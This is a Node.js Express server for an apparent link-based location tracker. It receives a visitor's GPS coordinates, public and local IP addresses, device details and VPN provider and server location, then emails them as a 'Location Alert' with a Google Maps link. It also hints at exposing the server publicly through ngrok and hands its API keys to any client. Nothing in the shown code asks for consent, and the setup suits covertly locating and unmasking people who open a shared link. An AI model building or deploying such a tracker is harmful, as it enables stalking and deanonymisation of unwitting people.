require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Serve static files
app.use(express.static(path.join(__dirname)));

// Endpoint to provide API keys to client
app.get('/api-keys', (req, res) => {
  res.json({
    IPGEOLOCATION_API_KEY: process.env.IPGEOLOCATION_API_KEY,
    VPNAPI_KEY: process.env.VPNAPI_KEY,
    IPQUALITY_KEY: process.env.IPQUALITY_KEY
  });
});

// Root route
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Route to receive location data
app.post("/log", async (req, res) => {
  const { 
    lat, 
    lng, 
    timestamp, 
    accuracy, 
    userAgent, 
    device, 
    publicIpAddress, 
    localIpAddress, 
    isVPN, 
    vpnProvider, 
    vpnLocation 
  } = req.body;

  if (typeof lat !== "number" || typeof lng !== "number") {
    return res.status(400).json({ error: "Invalid or missing lat/lng" });
  }

  const mapLink = `https://www.google.com/maps?q=${lat.toFixed(6)},${lng.toFixed(6)}`;
  const formattedTime = new Date(timestamp || Date.now()).toLocaleString();
  
  console.log(`[${new Date().toISOString()}] Location received: ${lat.toFixed(6)}, ${lng.toFixed(6)}`);
  console.log(`VPN Status: ${isVPN ? 'Detected' : 'Not detected'}`);

  // Email credentials
  const EMAIL_USER = process.env.EMAIL_USER;
  const EMAIL_PASS = process.env.EMAIL_PASS;
  const EMAIL_TO = process.env.EMAIL_TO || EMAIL_USER;

  if (!EMAIL_USER || !EMAIL_PASS) {
    console.warn("⚠️ Email credentials not set. Skipping email.");
    return res.status(200).json({
      message: "Location received (email not sent - missing credentials)",
      link: mapLink
    });
  }

  try {
    // Setup transporter
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: EMAIL_USER,
        pass: EMAIL_PASS
      }
    });

    // Professional HTML email template
    const htmlTemplate = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Location Alert</title>
      <style>
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          line-height: 1.6;
          color: #333;
          background-color: #f9f9f9;
          margin: 0;
          padding: 0;
        }
        .email-container {
          max-width: 650px;
          margin: 0 auto;
          background-color: #ffffff;
        }
        .email-header {
          background: linear-gradient(135deg, #1a2a6c, #b21f1f);
          color: white;
          padding: 30px;
          text-align: center;
        }
        .email-body {
          padding: 30px;
        }
        .alert-badge {
          background-color: #fff2f0;
          color: #d63626;
          padding: 12px 20px;
          border-radius: 6px;
          font-weight: 600;
          margin-bottom: 25px;
          border-left: 4px solid #d63626;
          display: flex;
          align-items: center;
        }
        .alert-badge svg {
          margin-right: 10px;
        }
        .data-table {
          width: 100%;
          border-collapse: collapse;
          margin: 20px 0;
          background-color: #f8f9fa;
          border-radius: 8px;
          overflow: hidden;
          box-shadow: 0 1px 3px rgba(0,0,0,0.05);
        }
        .data-table th {
          background-color: #e9ecef;
          text-align: left;
          padding: 15px;
          font-weight: 600;
          color: #495057;
          border-bottom: 2px solid #dee2e6;
        }
        .data-table td {
          padding: 15px;
          border-bottom: 1px solid #dee2e6;
        }
        .data-table tr:last-child td {
          border-bottom: none;
        }
        .vpn-alert {
          background-color: #fff3cd;
          color: #ff00fbff;
          padding: 12px 20px;
          border-radius: 6px;
          margin: 20px 0;
          border-left: 4px solid #ffc107;
        }
        .map-link {
          display: inline-block;
          background: linear-gradient(135deg, #1a2a6c, #b21f1f);
          color: white;
          text-decoration: none;
          padding: 14px 28px;
          border-radius: 6px;
          font-weight: 600;
          margin: 20px 0;
          transition: all 0.3s ease;
        }
        .map-link:hover {
          background: linear-gradient(135deg, #152359, #8e1919);
          box-shadow: 0 4px 12px rgba(26, 42, 108, 0.2);
        }
        .footer {
          text-align: center;
          padding: 25px;
          color: #6c757d;
          font-size: 13px;
          border-top: 1px solid #eaeaea;
          background-color: #f8f9fa;
        }
        .info-section {
          background-color: #f8f9fa;
          padding: 20px;
          border-radius: 8px;
          margin: 25px 0;
        }
        .timestamp {
          color: #6c757d;
          font-size: 14px;
          margin-top: 5px;
        }
        @media only screen and (max-width: 600px) {
          .email-body {
            padding: 20px;
          }
          .data-table th, .data-table td {
            padding: 10px;
          }
        }
      </style>
    </head>
    <body>
      <div class="email-container">
        <div class="email-header">
          <h1>📍 Location Alert Notification</h1>
          <p>New position data received - Security Monitoring System</p>
        </div>
        
        <div class="email-body">
          <div class="alert-badge">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M12 9V14M12 17V17.01M3 12C3 4.5885 4.5885 3 12 3C19.4115 3 21 4.5885 21 12C21 19.4115 19.4115 21 12 21C4.5885 21 3 19.4115 3 12Z" stroke="#d63626" stroke-width="2" stroke-linecap="round"/>
            </svg>
            Alert: New Location Data Received
          </div>
          
          <p>Hello Security Team,</p>
          <p>A new location has been submitted through the tracking system. Please review the details below:</p>
          
          ${isVPN ? `
          <div class="vpn-alert">
            <strong><i class="fas fa-shield-alt"></i> VPN DETECTED:</strong> User is connected through a VPN service.
          </div>
          ` : ''}
          
          <table class="data-table">
            <tr>
              <th>Parameter</th>
              <th>Value</th>
            </tr>
            <tr>
              <td>Device Type</td>
              <td>${device || 'Unknown Device'}</td>
            </tr>
            <tr>
              <td>Coordinates</td>
              <td>Lat: ${lat.toFixed(6)}, Lng: ${lng.toFixed(6)}</td>
            </tr>
            <tr>
              <td>Accuracy</td>
              <td>${accuracy ? Math.round(accuracy) + ' meters' : 'Not available'}</td>
            </tr>
            <tr>
              <td>Public IP Address</td>
              <td>${publicIpAddress || 'Not available'}</td>
            </tr>
            <tr>
              <td>Local IP Address</td>
              <td>${localIpAddress || 'Not available'}</td>
            </tr>
            <tr>
              <td>VPN Detected</td>
              <td>${isVPN ? 'Yes' : 'No'}</td>
            </tr>
            ${isVPN ? `
            <tr>
              <td>VPN Provider</td>
              <td>${vpnProvider || 'Unknown'}</td>
            </tr>
            <tr>
              <td>Active VPN Server Location</td>
              <td>${vpnLocation || 'Unknown'}</td>
            </tr>
            ` : ''}
          </table>
          
          <div style="text-align: center;">
            <a href="${mapLink}" class="map-link">
              View Exact Location on Google Maps
            </a>
          </div>
          
          <div class="info-section">
            <p class="timestamp">Timestamp: ${formattedTime}</p>
          </div>
          
          <p>This alert was automatically generated by the Location Tracking System.</p>
          
          <p>Best regards,<br>
          <strong>Security Monitoring System</strong></p>
        </div>
        
        <div class="footer">
          <p>This is an automated message. Please do not reply to this email.</p>
          <p>© 2025 Security Monitoring System | All rights reserved</p>
        </div>
      </div>
    </body>
    </html>
    `;

    // Mail content
    const mailOptions = {
      from: `"Security System" <${EMAIL_USER}>`,
      to: EMAIL_TO,
      subject: `📍 Location Alert: ${isVPN ? 'VPN Detected - ' : ''}New Position Data Received`,
      html: htmlTemplate,
      text: `Location Alert: ${mapLink}\nCoordinates: Lat: ${lat.toFixed(6)}, Lng: ${lng.toFixed(6)}\nTimestamp: ${formattedTime}\nDevice: ${device}\nPublic IP: ${publicIpAddress}\nLocal IP: ${localIpAddress}\nVPN Detected: ${isVPN ? 'Yes' : 'No'}${isVPN ? `\nVPN Provider: ${vpnProvider}\nVPN Server Location: ${vpnLocation}` : ''}`
    };

    // Send email
    const info = await transporter.sendMail(mailOptions);
    console.log("✅ Email sent:", info.messageId);
    
    return res.status(200).json({
      message: "Location received and email sent",
      link: mapLink
    });
  } catch (error) {
    console.error("❌ Email Send Error:", error);
    return res.status(200).json({
      message: "Location received (email failed to send)",
      link: mapLink
    });
  }
});

// Start server
const port = process.env.PORT || 4000;
app.listen(port, () => {
  console.log(`🚀 Server running on http://localhost:${port}`);
  console.log(`🔗 Use with Ngrok: ngrok http ${port}`);
});